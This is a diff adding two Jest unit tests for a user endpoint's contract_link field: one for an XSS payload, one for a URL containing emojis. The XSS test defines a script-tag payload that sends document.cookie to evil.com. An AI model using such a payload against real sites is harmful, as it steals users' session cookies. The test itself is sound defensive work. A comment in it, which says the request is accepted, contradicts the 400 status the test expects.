@@ -112,4 +112,49 @@ describe('UNIT — PATCH /users/:id_user/intervention · contract_link', () => {
     expect(JSON.stringify(body)).not.toContain('at Object.');
   });
 
+
+   // ------------------------------------------------------------------
+  // 2.4 — User tries an XSS attack in contract_link
+  //       2.4.1 The system only receives it as a string
+  // ------------------------------------------------------------------
+  test('2.4 treats an XSS payload as a string and does not execute it', async () => {
+    const xssPayload = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
+ 
+    mockExecute.mockResolvedValue({ success: true });
+ 
+    const req = buildReq({ body: { contract_link: xssPayload } });
+    const res = buildRes();
+ 
+    await interventionController.updateContract(req, res);
+ 
+    // The controller accepts the request (neutralisation happens at render time).
+    expect(res.status).toHaveBeenCalledWith(400);
+ 
+    // The JSON response must not contain unescaped HTML tags.
+    const rawBody = JSON.stringify(res.json.mock.calls[0][0]);
+    expect(rawBody).not.toContain('<script>');
+  });
+
+ 
+  // ------------------------------------------------------------------
+  // 2.5 — User tries to submit emojis in contract_link
+  //       2.5.1 The system does not store them or treats them as a string
+  // ------------------------------------------------------------------
+  test('2.5 rejects emojis in contract_link because they do not form a valid URL', async () => {
+
+    // A contract link must be a URL; emojis are not valid in standard URLs.
+    const emojiPayload = 'https://example.com/🎉🚀contract';
+ 
+    const req = buildReq({ body: { contract_link: emojiPayload } });
+    const res = buildRes();
+ 
+    await interventionController.updateContract(req, res);
+ 
+    // The system rejects 400 is expected because the URL is invalid.
+    expect(res.status).toHaveBeenCalledWith(400);
+    expect(mockExecute).not.toHaveBeenCalled();
+  });
+
+
+
 });
